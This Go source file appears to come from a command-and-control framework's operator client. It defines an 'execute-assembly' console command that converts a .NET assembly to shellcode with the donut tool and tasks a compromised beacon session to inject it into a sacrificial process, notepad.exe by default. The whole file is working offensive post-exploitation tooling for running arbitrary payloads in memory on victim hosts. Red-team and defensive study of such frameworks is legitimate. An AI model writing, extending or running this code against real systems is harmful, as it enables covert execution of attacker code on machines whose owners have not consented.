package grumblecli

import (
	"fmt"
	"os"
	"os/exec"
	"strings"

	"github.com/desertbit/grumble"
	"google.golang.org/grpc"

	"orsted/client/clientrpc"
)

var (
	donutPath     string = "tools/donut"
	shellcodePath string = "tools/donut.shellcode"
)

func SetAssembluExecCommand(conn grpc.ClientConnInterface) {
	assemblyExecCmd := &grumble.Command{
		Name: "execute-assembly",
		Help: "Load and Execute NET Assembly with donut",
		Flags: func(f *grumble.Flags) {
			f.String("m", "method", "1", "Method to load Assembly")
			f.String("p", "process", "C:\\Windows\\System32\\notepad.exe", "Sacrificial Process")
		},
		Args: func(f *grumble.Args) {
			f.String("file", "Assembly to load")
			f.StringList("args", "Argument of the Assembly")
		},
		Completer: func(prefix string, args []string) []string {
			batcaveSuggestion := GetListOfGadgetName("exe") 
			batcaveSuggestion = append(batcaveSuggestion, GetListOfGadgetName("dotnet")...)
			var suggestions []string

            var modulesList []string
            if len(args) == 0 {
                modulesList = batcaveSuggestion
            }
			for _, moduleName := range modulesList {
				if strings.HasPrefix(moduleName, prefix) {
					suggestions = append(suggestions, moduleName + ".exe")
				}
			}
			return suggestions
		},
		Run: func(c *grumble.Context) error {
			if SelectedSession == nil {
				fmt.Println("No session selected. Use interact command to specify session")
				return nil
			}
			assemblyName := c.Args.String("file")
			DownloadAndUnzipBatGadget(strings.TrimSuffix(assemblyName, ".exe"), false)
			assemblyArgs := ""
			for i := 0; i < len(c.Args.StringList("args")); i++ {
				assemblyArgs += c.Args.StringList("args")[i]
				assemblyArgs += " "

			}
			args := []string{
				"-f", "1",
				"-m", "RunMe",
				"-x", "2",
				"-p", assemblyArgs,
				"-o", shellcodePath,
				"-i", Conf.NetAssemblyPath + assemblyName,
			}
			cmd := exec.Command(donutPath, args...)
		    _, err := cmd.Output()
			if err != nil {
				fmt.Println("Error executing Donut command:", err)
				return nil
			}
			b, err := os.ReadFile(shellcodePath)
			if err != nil {
				fmt.Println("Error Occured ", err.Error())
				return nil
			}
			res, err := clientrpc.AddTaskFunc(conn, SelectedSession.Id, "execute-assembly "+c.Flags.String("method")+ " " + c.Flags.String("process"), b, fmt.Sprintf("execute-assembly --method %s --process %s %s %s", c.Flags.String("method"), c.Flags.String("process"), assemblyName, assemblyArgs))
			if err != nil {
				fmt.Println("Error Occured ", err.Error())
				return nil
			}
			var data [][]string
			data = append(data, []string{
				res.TaskId,
				res.BeacondId,
				res.State,
				string(res.Command),
			})
			prettyPrint(data, []string{"TASKID", "SESSIONID", "STATE", "COMMAND"}, c.App.Stdout())
			return nil
		},
	}


	app.AddCommand(assemblyExecCmd)
}
